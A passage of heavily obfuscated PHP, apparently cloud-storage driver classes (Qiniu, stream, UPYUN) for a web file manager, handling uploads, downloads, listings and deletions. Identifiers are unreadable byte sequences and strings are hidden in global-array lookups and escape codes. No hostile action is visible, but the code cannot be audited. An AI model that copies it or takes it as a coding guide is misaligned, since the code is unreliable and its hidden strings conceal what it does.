$šÔâîİ) { $·ù¾ÛÛæ[] = $this->link($šÔâîİ); } } else { $·ù¾ÛÛæ[] = $this->link($‹åôÉä¤); } $ß¤µ«€à = new Qiniu\Cdn\CdnManager($this->auth); list($ş›‚Ê İ, $ó’‘˜æ†) = $ß¤µ«€à->refreshUrls($·ù¾ÛÛæ); if ($ó’‘˜æ†) { return !1; } return $ş›‚Ê İ[$òÆı‰Ÿ°[1277]] == $òÆı‰Ÿ°[842] ? !0 : !1; } public function fileSubstr($ÖšË¬Êí, $ˆËå»†Š, $¦‹¶¶‚¡) { $üÓ¦ùØ‡ =& $_SERVER[Ùæõ‰Ï’]; if (!($ªù¿ºº· = $this->link($ÖšË¬Êí))) { return !1; } $Øûä‰İ = !1; if ($¦‹¶¶‚¡ > 0) { $úÆ©Ïãñ = $ˆËå»†Š + $¦‹¶¶‚¡ - 1; $Øûä‰İ = array($üÓ¦ùØ‡[1546] . $ˆËå»†Š . $üÓ¦ùØ‡[462] . $úÆ©Ïãñ); } $ŞÍÄå€ = url_request($ªù¿ºº·, $üÓ¦ùØ‡[261], !1, $Øûä‰İ); return $ŞÍÄå€[$üÓ¦ùØ‡[833]] ? $ŞÍÄå€[$üÓ¦ùØ‡[1300]] : !1; } public function upload($Ÿ“õ²ªÚ, $æ¤ÍåÖß, $ÎÕåµğ = false, $Š§œºÒ = REPEAT_REPLACE) { $Â®±Üœ‘ = new Qiniu\Storage\UploadManager(); $ÈĞÛÛé = $this->auth->uploadToken($this->bucket, $Ÿ“õ²ªÚ); $ÅÇãÎÅ’ = get_file_mime(get_path_ext($æ¤ÍåÖß)); list($ıÏ³Ú÷, $­ö…‹¼) = $Â®±Üœ‘->putFile($ÈĞÛÛé, $Ÿ“õ²ªÚ, $æ¤ÍåÖß, null, $ÅÇãÎÅ’); return $­ö…‹¼ ? !1 : $this->getPathOuter($Ÿ“õ²ªÚ); } public function uploadFormData($Õ§¥Üí³, $çØÏøî = 3600) { return $this->uploadToken($Õ§¥Üí³, $çØÏøî); } public function multiUploadFormData($äÇŞã», $±–ËÅ  = 3600) { return $this->uploadToken($äÇŞã», $±–ËÅ ); } private function uploadToken($‡¤Úûª‡, $ªÅ©¹õÂ = 3600) { $âÓû›È =& $_SERVER[Ùæõ‰Ï’]; $¼üæêà = $ªÅ©¹õÂ; $©«®¡· = array($âÓû›È[1547] => $âÓû›È[1548]); $ÔšÓîûü = $‡¤Úûª‡; $£™Æµá = $this->auth->uploadToken($this->bucket, $ÔšÓîûü, $¼üæêà, $©«®¡·, !0); $ƒ‹Û‚ĞÈ = empty($this->region) || $this->region == $âÓû›È[1549] ? $âÓû›È[12] : $âÓû›È[462] . $this->region; $¬õöĞ± = http_type() . "\x3a\x2f\57\165\x70\x6c\x6f\141\144{$ƒ‹Û‚ĞÈ}\x2e\x71\151\156\x69\x75\x70\56\143\157\x6d\x2f"; return array($âÓû›È[1550] => $£™Æµá, $âÓû›È[1551] => $¬õöĞ±); } public function download($½ıÑİû, $âõí‡ì) { $Åà™É„÷ = IO::getPathInner(IO::mkfile($âõí‡ì)); if (!($šÉ€³æë = $this->link($½ıÑİû))) { return !1; } $‰±§Ïşı = 0; $ñ–³ŠµÔ = 1024 * 200; $ÈúéãäĞ = fopen($Åà™É„÷, $_SERVER[Ùæõ‰Ï’][1552]); while (!0) { $“Î¬Ş€ñ = $this->fileSubstr($½ıÑİû, $‰±§Ïşı, $ñ–³ŠµÔ); if ($“Î¬Ş€ñ === !1) { return !1; } fwrite($ÈúéãäĞ, $“Î¬Ş€ñ); $‰±§Ïşı += $ñ–³ŠµÔ; if (strlen($“Î¬Ş€ñ) < $ñ–³ŠµÔ) { break; } } fclose($ÈúéãäĞ); return $âõí‡ì; } public function link($ñË …Ã, $‰ÖêêÖÔ = '') { if (!$this->isFile($ñË …Ã)) { return !1; } $‡äüß¨Õ = $this->getHost() . $_SERVER[Ùæõ‰Ï’][8] . $this->pathEncode($ñË …Ã) . $‰ÖêêÖÔ; return $this->auth->privateDownloadUrl($‡äüß¨Õ, 3600 * 12); } public function fileOut($ş«¡¡ı, $öıêóÖÚ = false, $Ø¹²úªÇ = false, $“Î›‘û¿ = '') { $¥§çÆ =& $_SERVER[Ùæõ‰Ï’]; if ($this->isFileOutServer()) { return $this->fileOutServer($ş«¡¡ı, $öıêóÖÚ, $Ø¹²úªÇ, $“Î›‘û¿); } if (!$Ø¹²úªÇ) { $Ø¹²úªÇ = $this->pathThis($ş«¡¡ı); } $á³­€•Ç = $öıêóÖÚ ? $¥§çÆ[1553] . rawurlencode($Ø¹²úªÇ) : $¥§çÆ[12]; $»»æˆ = $this->link($ş«¡¡ı, $á³­€•Ç); $this->fileOutLink($»»æˆ); } public function fileOutServer($ˆƒªß¢”, $õ¿³¤Îİ = false, $´üä = false, $÷ÍÁÏÑó = '') { parent::fileOut($ˆƒªß¢”, $õ¿³¤Îİ, $´üä, $÷ÍÁÏÑó); } public function fileOutImage($´‚Ì¶É, $’áå·ˆ = 250) { if ($this->size($´‚Ì¶É) > 1024 * 1024 * 20) { return $this->fileOutImageServer($´‚Ì¶É, $’áå·ˆ); } $™¢¦è  = $this->link($´‚Ì¶É, $_SERVER[Ùæõ‰Ï’][1554] . $’áå·ˆ); $this->fileOutLink($™¢¦è ); } public function fileOutImageServer($¢Æ ¶ù½, $²®”ñòÜ = 250) { parent::fileOutImage($¢Æ ¶ù½, $²®”ñòÜ); } public function hashMd5($Ùñ›—†ß) { $êÑ¸û¶… =& $_SERVER[Ùæõ‰Ï’]; $¿áæâ¾Ğ = $this->objectMeta($Ùñ›—†ß); return isset($¿áæâ¾Ğ[$êÑ¸û¶…[245]]) ? $¿áæâ¾Ğ[$êÑ¸û¶…[245]] : !1; $èæ€İó¢ = $this->link($Ùñ›—†ß, $êÑ¸û¶…[1555]); } public function size($ºá·¨Ü) { $¸˜„Éí• = $this->objectMeta($ºá·¨Ü); return $¸˜„Éí• ? $¸˜„Éí•[$_SERVER[Ùæõ‰Ï’][79]] : 0; } public function info($ÒƒÙªú³) { if ($this->isFolder($ÒƒÙªú³)) { return $this->folderInfo($ÒƒÙªú³); } else { if ($this->isFile($ÒƒÙªú³)) { return $this->fileInfo($ÒƒÙªú³); } } return !1; } public function exist($—ú”·çğ) { return $this->isFile($—ú”·çğ) || $this->isFolder($—ú”·çğ); } public function isFile($½‡ˆ¢€Ú) { return !$this->isFolder($½‡ˆ¢€Ú) && $this->objectMeta($½‡ˆ¢€Ú); } public function isFolder($ğêáğ¹é) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][179], $ğêáğ¹é); } protected function objectMeta($©Æ°·Î‡) { return $this->cacheMethod($_SERVER[Ùæõ‰Ï’][181], $©Æ°·Î‡); } protected function _objectMeta($’âŠ­’) { $³šÀ±à =& $_SERVER[Ùæõ‰Ï’]; list($¿µßÂß , $€ğŒÀ©) = $this->bucketManager->stat($this->bucket, $’âŠ­’); if ($¿µßÂß ) { $¿µßÂß [$³šÀ±à[79]] = intval($¿µßÂß [$³šÀ±à[1541]]); } return $¿µßÂß ; } protected function _isFolder($é¥ÍËôŒ) { $¶áÇêÖ– =& $_SERVER[Ùæõ‰Ï’]; if ($é¥ÍËôŒ == $¶áÇêÖ–[12] || $é¥ÍËôŒ == $¶áÇêÖ–[8]) { return !0; } list($èÏ„Ö†Â, $í¶å‰¹Î) = $this->bucketManager->listFiles($this->bucket, trim($é¥ÍËôŒ, $¶áÇêÖ–[8]) . $¶áÇêÖ–[8], $¶áÇêÖ–[12], 1, $¶áÇêÖ–[8]); return !empty($èÏ„Ö†Â[$¶áÇêÖ–[1544]]) || !empty($èÏ„Ö†Â[$¶áÇêÖ–[1545]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ûÃñ®²õ, $¤»ÓÎœ = 0) { parent::__construct(); $this->source = $ûÃñ®²õ; $this->sourceSize = $¤»ÓÎœ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÙõŸ¹Èó = false) { return $this->sourceSize; } public function getContent($ííó²Ïæ = false) { return $this->fileSubstr($ííó²Ïæ, 0, $this->sourceSize); } public function fileSubstr($ä½ıô– = false, $‚íÒêÉÏ = 0, $â‰ƒ»î­ = 0) { if (!$â‰ƒ»î­) { $â‰ƒ»î­ = $this->sourceSize; } $ıõ±Î½Ç = $this->sourceSize - $‚íÒêÉÏ; if ($â‰ƒ»î­ >= $ıõ±Î½Ç) { $â‰ƒ»î­ = $ıõ±Î½Ç; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‚íÒêÉÏ, $â‰ƒ»î­); } if ($this->sourceType == self::TYPE_FILE) { if ($â‰ƒ»î­ <= 0) { return $_SERVER[Ùæõ‰Ï’][12]; } $ñÆ§¶ş = ftell($this->source); fseek_64($this->source, $ñÆ§¶ş + $‚íÒêÉÏ); $‘·ÚšŒÎ = @fread($this->source, $â‰ƒ»î­); fseek_64($this->source, $ñÆ§¶ş); return $‘·ÚšŒÎ; } } public function hashMd5($ü÷º®å’ = false) { return md5($this->getContent()); } public static function hash($ï¥şİ§–, $°…®š‡Ó = 0) { $¤¨­‹™Ø = new PathDriverStream($ï¥şİ§–, $°…®š‡Ó); return $¤¨­‹™Ø->hashSimple($ï¥şİ§–); } public static function md5($¥î‰«Ÿî, $—£«—“æ = 0) { $„Ó¾‹ö¦ = new PathDriverStream($¥î‰«Ÿî, $—£«—“æ); return $„Ó¾‹ö¦->hashMd5($¥î‰«Ÿî); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\x76\60\x2e\141\x70\x69\56\165\160\171\165\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($åè¼ÑÓô) { parent::__construct(); $this->_init($åè¼ÑÓô); } public function _init($‘‘Ô³ê›) { $ÎÏÒú‘Ó =& $_SERVER[Ùæõ‰Ï’]; foreach ($‘‘Ô³ê› as $û•ğÁñ¥ => $òæÛ³º) { if (isset($this->{$û•ğÁñ¥})) { $this->{$û•ğÁñ¥} = $òæÛ³º; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÎÏÒú‘Ó[1556] . LNG($ÎÏÒú‘Ó[1475])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¾¹ÒÖ¯ù, $é›‘¬ó = "\107\x45\x54") { $ûù„»¨ =& $_SERVER[Ùæõ‰Ï’]; $ãè®®ëŸ = gmdate($ûù„»¨[1504]); $Ó”ııï› = base64_encode(hash_hmac($ûù„»¨[1557], "{$é›‘¬ó}\x26{$¾¹ÒÖ¯ù}\x26{$ãè®®ëŸ}", md5("{$this->userpass}"), !0)); $Ğ©íîøº = array("\x41\x75\x74\150\157\x72\x69\172\141\164\151\157\x6e\x3a\125\120\x59\x55\x4e\40{$this->username}\72{$Ó”ııï›}", "\x44\x61\164\145\72{$ãè®®ëŸ}"); return $Ğ©íîøº; } public function ussRequest($¶÷ãäâ, $è½ñ‘üâ = "\107\105\124", $éùËÎ©Ê = false, $âÈŞ¨¡ = false, $ñŞ¦§âÏ = false) { $‘À—»«¢ =& $_SERVER[Ùæõ‰Ï’]; $¶÷ãäâ = trim($¶÷ãäâ, $‘À—»«¢[8]); $—íÓ›öÓ = "\x2f{$this->bucket}\x2f{$¶÷ãäâ}"; $š¥ïŞ³â = $this->ussHeaders($—íÓ›öÓ, $è½ñ‘üâ); if ($âÈŞ¨¡) { $š¥ïŞ³â = array_merge($š¥ïŞ³â, $âÈŞ¨¡); } $¥®œ¨É = url_request($this->endpoint . $—íÓ›öÓ, $è½ñ‘üâ, $éùËÎ©Ê, $š¥ïŞ³â, $ñŞ¦§âÏ); if (!$¥®œ¨É) { $Äàúâ³– = LNG($‘À—»«¢[1558]); $this->writeLog($Äàúâ³–); return array($‘À—»«¢[1310] => !1, $‘À—»«¢[1300] => $Äàúâ³–); } if (strtolower($è½ñ‘üâ) == $‘À—»«¢[227] || in_array($¥®œ¨É[$‘À—»«¢[1310]], array($‘À—»«¢[274], $‘À—»«¢[1559]))) { $éùËÎ©Ê = $¥®œ¨É[$‘À—»«¢[1560]]; } else { $éùËÎ©Ê = json_decode($¥®œ¨É[$‘À—»«¢[1300]], !0); if (!$éùËÎ©Ê) { $éùËÎ©Ê = $¥®œ¨É[$‘À—»«¢[1300]]; } else { if (!$¥®œ¨É[$‘À—»«¢[833]] && isset($éùËÎ©Ê[$‘À—»«¢[1561]])) { $éùËÎ©Ê = $éùËÎ©Ê[$‘À—»«¢[1561]]; } } } if (!$¥®œ¨É[$‘À—»«¢[833]]) { $this->writeLog($this->__errorMessage($éùËÎ©Ê)); } return array($‘À—»«¢[1310] => $¥®œ¨É[$‘À—»«¢[833]], $‘À—»«¢[1300] => $éùËÎ©Ê); } private function __errorMessage($Ò»ªæÌ) { $ÍµÆ÷Ä¦ =& $_SERVER[Ùæõ‰Ï’]; if (!$Ò»ªæÌ) { return $ÍµÆ÷Ä¦[12]; } static $±¹ú°âÌ = null; if (!$±¹ú°âÌ) { $±¹ú°âÌ = I18n::getType(); } if ($±¹ú°âÌ != $ÍµÆ÷Ä¦[1514]) { return $Ò»ªæÌ; } $›¡ˆƒ™Ú = array($ÍµÆ÷Ä¦[1562] => $ÍµÆ÷Ä¦[1563], $ÍµÆ÷Ä¦[1564] => $ÍµÆ÷Ä¦[1565], $ÍµÆ÷Ä¦[1566] => $ÍµÆ÷Ä¦[1565], $ÍµÆ÷Ä¦[1567] => $ÍµÆ÷Ä¦[1568], $ÍµÆ÷Ä¦[1569] => $ÍµÆ÷Ä¦[1570], $ÍµÆ÷Ä¦[1571] => $ÍµÆ÷Ä¦[1572], $ÍµÆ÷Ä¦[1573] => $ÍµÆ÷Ä¦[1574]); return isset($›¡ˆƒ™Ú[$Ò»ªæÌ]) ? $›¡ˆƒ™Ú[$Ò»ªæÌ] : $Ò»ªæÌ; } public function mkfile($üüÜú¥“, $Õ–ä® = '', $ûŞÁ¨´ = REPEAT_RENAME) { if ($this->setContent($üüÜú¥“, $Õ–ä®)) { return $this->getPathOuter($üüÜú¥“); } return !1; } public function mkdir($ãÊÄŸ§¯, $‚¯ãÈ˜Ì = REPEAT_SKIP) { $Ìù½¹ğ¢ =& $_SERVER[Ùæõ‰Ï’]; $ŠË Øå = trim($ãÊÄŸ§¯, $Ìù½¹ğ¢[8]); if ($this->_isFolder($ŠË Øå)) { return $this->getPathOuter($ŠË Øå); } $€è¼Ü¿Ó = array($Ìù½¹ğ¢[1575]); $âÏŒ˜Ğ¿ = $this->ussRequest($ŠË Øå, $Ìù½¹ğ¢[257], !1, $€è¼Ü¿Ó); return $âÏŒ˜Ğ¿[$Ìù½¹ğ¢[1310]] ? $this->getPathOuter($ŠË Øå) : !1; } public function copyFile($ú”øÅ¨, $ª¸Ë÷Íù) { $å‚ÏÜÊú =& $_SERVER[Ùæõ‰Ï’]; $Ø¤³†»§ = array($å‚ÏÜÊú[1576] . "\x2f{$this->bucket}\x2f{$ú”øÅ¨}", $å‚ÏÜÊú[1577]); $Ê¬÷ë«÷ = $this->ussRequest($ª¸Ë÷Íù, $å‚ÏÜÊú[259], !1, $Ø¤³†»§); return $Ê¬÷ë«÷[$å‚ÏÜÊú[1310]] ? !0 : $this->getPathOuter($ª¸Ë÷Íù); } public function moveFile($ïï§¨­æ, $û½ˆí·) { $‰¶µ‰æ‘ =& $_SERVER[Ùæõ‰Ï’]; $¤ÌâşƒÁ = array($‰¶µ‰æ‘[1578] . "\57{$this->bucket}\x2f{$ïï§¨­æ}", $‰¶µ‰æ‘[1577]); $¯»òœ = $this->ussRequest($û½ˆí·, $‰¶µ‰æ‘[259], !1, $¤ÌâşƒÁ); return $¯»òœ[$‰¶µ‰æ‘[1310]] ? !0 : $this->getPathOuter($û½ˆí·); } public function delFile($ŸÍôæÏ™) { $˜°»‹œË =& $_SERVER[Ùæõ‰Ï’]; $€·¾ßæ = $this->ussRequest($ŸÍôæÏ™, $˜°»‹œË[1579]); return $€·¾ßæ[$˜°»‹œË[1310]] ? !0 : !1; } public function delFolder($¡†¼Ûø¤) { $‘¡‡åú„ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->exist($¡†¼Ûø¤)) { return !0; } $this->listItemCache = !1; $ÎšĞ÷Ì± = $í‘‹¦¤æ = array(); $this->fileList($¡†¼Ûø¤, $ÎšĞ÷Ì±, $í‘‹¦¤æ, !0); $this->listItemCache = !0; foreach ($í‘‹¦¤æ as $Š¬Áäâğ) { $ãá©•É» = $this->ussRequest($Š¬Áäâğ[$‘¡‡åú„[32]], $‘¡‡åú„[1579]); if (!$ãá©•É»[$‘¡‡åú„[1310]]) { return !1; } } foreach ($ÎšĞ÷Ì± as $Œ—Ç€ÚØ) { $ãá©•É» = $this->ussRequest($Œ—Ç€ÚØ, $‘¡‡åú„[1579]); if (!$ãá©•É»[$‘¡‡åú„[1310]]) { return !1; } } $ãá©•É» = $this->ussRequest($¡†¼Ûø¤, $‘¡‡åú„[1579]); return $ãá©•É»[$‘¡‡åú„[1310]]; } public function rename($ùÒ„»‘ˆ, $¥™ÜÑªÌ) { if ($this->isFile($ùÒ„»‘ˆ)) { $¥™ÜÑªÌ = get_path_father($ùÒ„»‘ˆ) . $¥™ÜÑªÌ; return $this->moveFile($ùÒ„»‘ˆ, $¥™ÜÑªÌ); } return $this->renameObject($ùÒ„»‘ˆ, $¥™ÜÑªÌ); } public function fileInfo($ÈÎé×µò, $ˆµúüûÀ = false, $»­İôÜª = array()) { $Ş˜÷¸Ì¦ =& $_SERVER[Ùæõ‰Ï’]; $Ñé¤ù°† = array($Ş˜÷¸Ì¦[32] => $this->pathThis($ÈÎé×µò), $Ş˜÷¸Ì¦[87] => $this->getPathOuter($Ş˜÷¸Ì¦[8] . $ÈÎé×µò), $Ş˜÷¸Ì¦[33] => $Ş˜÷¸Ì¦[230], $Ş˜÷¸Ì¦[79] => isset($»­İôÜª[$Ş˜÷¸Ì¦[79]]) ? $»­İôÜª[$Ş˜÷¸Ì¦[79]] : 0, $Ş˜÷¸Ì¦[169] => $this->ext($ÈÎé×µò)); if ($ˆµúüûÀ) { return $Ñé¤ù°†; } $Ñé¤ù°†[$Ş˜÷¸Ì¦[231]] = $Ñé¤ù°†[$Ş˜÷¸Ì¦[88]] = 0; $Ñé¤ù°†[$Ş˜÷¸Ì¦[232]] = $Ñé¤ù°†[$Ş˜÷¸Ì¦[233]] = !0; if (empty($»­İôÜª)) { $»­İôÜª = $this->objectMeta($ÈÎé×µò); if (!$»­İôÜª) { return $Ñé¤ù°†; } } $Ñé¤ù°†[$Ş˜÷¸Ì¦[231]] = intval($»­İôÜª[$Ş˜÷¸Ì¦[1580]]); $Ñé¤ù°†[$Ş˜÷¸Ì¦[88]] = intval($»­İôÜª[$Ş˜÷¸Ì¦[1581]]); $Ñé¤ù°†[$Ş˜÷¸Ì¦[79]] = $»­İôÜª[$Ş˜÷¸Ì¦[79]]; return $Ñé¤ù°†; } public function folderInfo($üîê˜ÖÕ, $Ö‘²àµï = false) { $íÔÛâ–ì =& $_SERVER[Ùæõ‰Ï’]; $¾µ‚ìó = array($íÔÛâ–ì[32] => $this->pathThis($üîê˜ÖÕ), $íÔÛâ–ì[87] => $this->getPathOuter($íÔÛâ–ì[8] . $üîê˜ÖÕ), $íÔÛâ–ì[33] => $íÔÛâ–ì[78]); if ($Ö‘²àµï) { return $¾µ‚ìó; } $¾µ‚ìó[$íÔÛâ–ì[231]] = $¾µ‚ìó[$íÔÛâ–ì[88]] = 0; $¾µ‚ìó[$íÔÛâ–ì[232]] = $¾µ‚ìó[$íÔÛâ–ì[233]] = !0; if (empty($÷Ÿ¯‡»Ÿ)) { $÷Ÿ¯‡»Ÿ = $this->objectMeta($üîê˜ÖÕ); if (!$÷Ÿ¯‡»Ÿ) { return $¾µ‚ìó; } } $¾µ‚ìó[$íÔÛâ–ì[231]] = intval($÷Ÿ¯‡»Ÿ[$íÔÛâ–ì[1580]]); $¾µ‚ìó[$íÔÛâ–ì[88]] = intval($÷Ÿ¯‡»Ÿ[$íÔÛâ–ì[1581]]); return $¾µ‚ìó; } private function listObjs($ºËÖ‹¥É, $†´ú™£İ = 0, $Ì°ıÒ× = 1000) { $·àãÉ”ä =& $_SERVER[Ùæõ‰Ï’]; $ñ«áÒŒÁ = array($·àãÉ”ä[1582], $·àãÉ”ä[1583] . $Ì°ıÒ×); if ($†´ú™£İ) { $ñ«áÒŒÁ[] = $·àãÉ”ä[1584] . $†´ú™£İ; } $”Óâºœ = $this->ussRequest($ºËÖ‹¥É, $·àãÉ”ä[261], !1, $ñ«áÒŒÁ); return !$”Óâºœ[$·àãÉ”ä[1310]] ? !1 : $”Óâºœ[$·àãÉ”ä[1300]]; } private function fileList($òü×ÙÂŠ, &$ìÏ“„½¢, &$¶œÒó†Ô, $œŒ‘ñÂ = false) { $öÔ”ì¶í =& $_SERVER[Ùæõ‰Ï’]; $–®ƒƒ€¢ = $öÔ”ì¶í[12]; $…Ëååò = 1000; $½¶é¬¨‰ = rtrim($òü×ÙÂŠ, $öÔ”ì¶í[8]) . $öÔ”ì¶í[8]; while (!0) { check_abort(); $³ã©´“Á = $this->listObjs($òü×ÙÂŠ, $–®ƒƒ€¢, $…Ëååò); if (!$³ã©´“Á) { return !1; } $–®ƒƒ€¢ = isset($³ã©´“Á[$öÔ”ì¶í[1585]]) ? $³ã©´“Á[$öÔ”ì¶í[1585]] : $öÔ”ì¶í[12]; $…Ï¸òÔ‚ = isset($³ã©´“Á[$öÔ”ì¶í[1586]]) ? $³ã©´“Á[$öÔ”ì¶í[1586]] : array(); foreach ($…Ï¸òÔ‚ as $´¡ƒÜû) { $µÏŸÀÅì = $´¡ƒÜû[$öÔ”ì¶í[33]] == $öÔ”ì¶í[78] ? !0 : !1; $“É¼»Š = ltrim($½¶é¬¨‰ . $´¡ƒÜû[$öÔ”ì¶í[32]], $öÔ”ì¶í[8]) . ($µÏŸÀÅì ? $öÔ”ì¶í[8] : $öÔ”ì¶í[12]); $‹çÆ¹½õ = array($öÔ”ì¶í[32] => $“É¼»Š, $öÔ”ì¶í[33] => $µÏŸÀÅì ? $öÔ”ì¶í[78] : $öÔ”ì¶í[230], $öÔ”ì¶í[79] => $´¡ƒÜû[$öÔ”ì¶í[413]], $öÔ”ì¶í[1581] => $´¡ƒÜû[$öÔ”ì¶í[1587]]); $this->cacheMethodInfoSet($“É¼»Š, $µÏŸÀÅì, $‹çÆ¹½õ); if ($µÏŸÀÅì) { $ìÏ“„½¢[] = $“É¼»Š; if ($œŒ‘ñÂ) { $this->fileList($“É¼»Š, $ìÏ“„½¢, $¶œÒó†Ô, $œŒ‘ñÂ); } continue; } $¶œÒó†Ô[] = $‹çÆ¹½õ; } if (count($…Ï¸òÔ‚) < $…Ëååò) { break; } } $this->cacheMethodInfoSet($òü×ÙÂŠ, !0); } public function listPath($ßê¯ş¥‡, $«Ü–Êµ¶ = false) { $»…Ã‹È× =& $_SERVER[Ùæõ‰Ï’]; $°ø¯Ëë¢ = $ƒÚ´ŒŠ = array(); $this->fileList($ßê¯ş¥‡, $°ø¯Ëë¢, $ƒÚ´ŒŠ); foreach ($°ø¯Ëë¢ as $›Ã†œæ‰ => $ä¨ÚõÖ¬) { $°ø¯Ëë¢[$›Ã†œæ‰] = $this->folderInfo($ä¨ÚõÖ¬, $«Ü–Êµ¶); } foreach ($ƒÚ´ŒŠ as $›Ã†œæ‰ => $ä¨ÚõÖ¬) { $ƒÚ´ŒŠ[$›Ã†œæ‰] = $this->fileInfo($ä¨ÚõÖ¬[$»…Ã‹È×[32]], $«Ü–Êµ¶, $ä¨ÚõÖ¬); } return array($»…Ã‹È×[85] => $°ø¯Ëë¢, $»…Ã‹È×[86] => $ƒÚ´ŒŠ); } public function has($²Ü–˜±Ö, $€æğ¬ßº = false, $…·¡óï­ = true) { $Êˆˆ©ï =& $_SERVER[Ùæõ‰Ï’]; $¶úõå‘û = $Êˆˆ©ï[12]; $½¶­¤¸ = 500; $ÂÅ­ÖµÎ = 0; $êøø‰ª¾ = 0; $û€¬Ù– = rtrim($²Ü–˜±Ö, $Êˆˆ©ï[8]) . $Êˆˆ©ï[8]; while (!0) { check_abort(); $°ğÆä‘… = $this->listObjs($²Ü–˜±Ö, $¶úõå‘û, $½¶­¤¸); if (!$°ğÆä‘…) { return !1; } $¶úõå‘û = isset($°ğÆä‘…[$Êˆˆ©ï[1585]]) ? $°ğÆä‘…[$Êˆˆ©ï[1585]] : $Êˆˆ©ï[12]; $Ñïê¬è„ = isset($°ğÆä‘…[$Êˆˆ©ï[1586]]) ? $°ğÆä‘…[$Êˆˆ©ï[1586]] : array(); if (empty($Ñïê¬è„)) { break; } $çÏÙ‡¿ = array_filter($Ñïê¬è„, function ($¼ˆ®±ùû) { $İİ—©şÃ =& $_SERVER[Ùæõ‰Ï’]; return $¼ˆ®±ùû[$İİ—©şÃ[33]] == $İİ—©şÃ[78]; }); $›ı×™Ğè = count($Ñïê¬è„); $çÏÙ‡¿ = count($çÏÙ‡¿); $¸€õ†–ë = $›ı×™Ğè - $çÏÙ‡¿; if ($€æğ¬ßº) { $êøø‰ª¾ += $çÏÙ‡¿; $ÂÅ­ÖµÎ += $¸€õ†–ë; if ($›ı×™Ğè < $½¶­¤¸) { break; } continue; } if ($…·¡óï­) { if ($¸€õ†–ë) { return !0; } } else { if ($çÏÙ‡¿) { return !0; } } if ($›ı×™Ğè < $½¶­¤¸) { break; } } if ($€æğ¬ßº) { return array($Êˆˆ©ï[239] => $ÂÅ­ÖµÎ, $Êˆˆ©ï[240] => $êøø‰ª¾); } return !1; } public function listAll($˜Ò”êÅ¸) { $ÀßÜó±µ =& $_SERVER[Ùæõ‰Ï’]; $³—„³šƒ = $ôìü¢ÜÀ = array(); $this->fileList($˜Ò”êÅ¸, $³—„³šƒ, $ôìü¢ÜÀ, !0); $œ”ûƒËª = array_to_keyvalue($ôìü¢ÜÀ, $ÀßÜó±µ[32]); foreach ($³—„³šƒ as $ÀîÃ°Å) { if (is_string($ÀîÃ°Å)) { $œ”ûƒËª[$ÀîÃ°Å] = array($ÀßÜó±µ[79] => 0); } } return $this->listAllFiles($˜Ò”êÅ¸, $œ”ûƒËª); } public function canRead($Âüş§ù) { return $this->exist($Âüş§ù) ? !0 : !1; } public function canWrite($‚’åë¹ª) { return $this->exist($‚’åë¹ª) ? !0 : !1; } public function getContent($°„Û…û¼) { return $this->fileSubstr($°„Û…û¼, 0, -1); } public function setContent($¯§œ’ñ‹, $Í²—Ôô = '') { $Š¯Éûíß =& $_SERVER[Ùæõ‰Ï’]; if (!$Í²—Ôô) { $ÆåŠ¸û = $this->ussRequest($¯§œ’ñ‹, $Š¯Éûíß[257]); return $ÆåŠ¸û[$Š¯Éûíß[1310]]; } $ş¶¤‹õË = $this->tempFile($this->pathThis($¯§œ’ñ‹)); file_put_contents($ş¶¤‹õË, $Í²—Ôô); if ($this->upload($¯§œ’ñ‹, $ş¶¤‹õË)) { $this->tempFileRemve($ş¶¤‹õË); return !0; } return !1; } public function fileSubstr($Œş‚Î Ê, $ÒëÙäãà, $û¬–¥¦õ) { $¼È¢Øç¦ =& $_SERVER[Ùæõ‰Ï’]; if (!($”ÎŠÍÏÙ = $this->link($Œş‚Î Ê))) { return !1; } $º¿ôœÄ® = !1; if ($û¬–¥¦õ > 0) { $ğì¿ùİ = $ÒëÙäãà + $û¬–¥¦õ - 1; $º¿ôœÄ® = array($¼È¢Øç¦[1546] . $ÒëÙäãà . $¼È¢Øç¦[462] . $ğì¿ùİ); } $¨”ò÷õ” = url_request($”ÎŠÍÏÙ, $¼È¢Øç¦[261], !1, $º¿ôœÄ®); return $¨”ò÷õ”[$¼È¢Øç¦[833]] ? $¨”ò÷õ”[$¼È¢Øç¦[1300]] : !1; } public function upload($ŒåÃÚŒ«, $æ¨ıôæ†, $­®àü“´ = false, $—öñÌ–÷ = REPEAT_REPLACE) { $ë‰™ò“¿ =& $_SERVER[Ùæõ‰Ï’]; $Ô¡ø––ş = IO::size($æ¨ıôæ†); if ($Ô¡ø––ş <= 1024 * 1024 * 200) { $‘°’ïóê = array($ë‰™ò“¿[1588] . $æ¨ıôæ†); $ã–·Ú£» = $this->ussRequest($ŒåÃÚŒ«, $ë‰™ò“¿[259], $‘°’ïóê); return $ã–·Ú£»[$ë‰™ò“¿[1310]] ? $this->getPathOuter($ŒåÃÚŒ«) : !1; } $ç»¥ÆÀğ = 1024 * 1024 * 10; $æÉæ í¬ = array($ë‰™ò“¿[1589], $ë‰™ò“¿[1590] . $Ô¡ø––ş, $ë‰™ò“¿[1591], $ë‰™ò“¿[1592] . $ç»¥ÆÀğ); $ã–·Ú£» = $this->ussRequest($ŒåÃÚŒ«, $ë‰™ò“¿[259], !1, $æÉæ í¬); if (!$ã–·Ú£»[$ë‰™ò“¿[1310]]) { return !1; } $Áººœ“ = $ã–·Ú£»[$ë‰™ò“¿[1300]]; $ÇÙÕª˜ï = 0; $¡‚Ù÷©© = $Áººœ“[$ë‰™ò“¿[1593]]; $Ôè«ö‡ü = fopen($æ¨ıôæ†, $ë‰™ò“¿[1469]); if (!$Ôè«ö‡ü) { return !1; } do { $ˆ‰ı¦Ñ° = $Áººœ“[$ë‰™ò“¿[1594]]; fseek_64($Ôè«ö‡ü, $ÇÙÕª˜ï); $Ó¯Ö™§ = fread($Ôè«ö‡ü, $ˆ‰ı¦Ñ°); 